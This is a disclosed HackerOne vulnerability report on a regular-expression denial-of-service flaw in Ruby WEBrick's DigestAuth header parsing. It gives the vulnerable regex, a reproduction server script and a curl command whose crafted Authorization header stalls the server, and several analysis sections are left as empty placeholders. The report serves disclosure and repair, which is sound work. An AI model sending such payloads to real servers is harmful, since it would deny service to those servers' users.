---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '661722'
original_report_id: '661722'
title: WEBrick::HTTPAuth::DigestAuth authentication is vulnerable to regular expression
  denial of service (ReDoS)
weakness: Uncontrolled Resource Consumption
team_handle: ruby
created_at: '2019-07-27T05:44:24.810Z'
disclosed_at: '2019-11-15T23:20:45.123Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# WEBrick::HTTPAuth::DigestAuth authentication is vulnerable to regular expression denial of service (ReDoS)

## Metadata

- HackerOne Report ID: 661722
- Weakness: Uncontrolled Resource Consumption
- Program: ruby
- Disclosed At: 2019-11-15T23:20:45.123Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The private instance method `split_param_value` in class `WEBrick::HTTPAuth::DigestAuth` uses a regular expression that is vulnerable to denial of service due to catastrophic backtracking.

The regular expression is: ^\s*([\w\-\.\*\%\!]+)=\s*\"((\\.|[^\"])*)\"\s*,?
Source: https://github.com/ruby/ruby/blob/149e414ed529d27aaeb0543bc133e08c782d8d41/lib/webrick/httpauth/digestauth.rb#L295

Sample attack string that causes catastrophic backtracking: a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b

The issue can be reproduced with the following HTTP server configured with DigestAuth:

```
#!/usr/bin/env ruby

require 'webrick'

config = { :Realm => 'DigestAuth example realm' }

htdigest = WEBrick::HTTPAuth::Htdigest.new 'my_password_file'
htdigest.set_passwd config[:Realm], 'username', 'password'
htdigest.flush

config[:UserDB] = htdigest

digest_auth = WEBrick::HTTPAuth::DigestAuth.new config

auth_handler = proc do |request, response|
  digest_auth.authenticate request, response
end

server = WEBrick::HTTPServer.new :Port => 8000, :RequestCallback => auth_handler

server.mount_proc '/' do |req, res|
  res.body = 'hello, world'
end

trap 'INT' do server.shutdown end
server.start
```

Running the program above, an attacker can cause the HTTP server to consume 100% CPU by sending an authorization header that exploits the catastrophic backtracking.

Sample HTTP request with cURL:
```sh
$ time curl -I --header 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b' http://localhost:8000
HTTP/1.1 400 Bad Request 
Content-Type: text/html; charset=ISO-8859-1
Server: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
Date: Sat, 27 Jul 2019 05:38:27 GMT
Content-Length: 291
Connection: close


real	0m9.714s
user	0m0.013s
sys	0m0.003s
```

Note that it takes the HTTP server 9 seconds to respond that it's a bad request. A larger attack string, like 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b', would take much longer to evaluate.

## Impact

An attacker could cause an effective denial of service, by crafting an input which exploits catastrophic backtracking for the regular expression.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
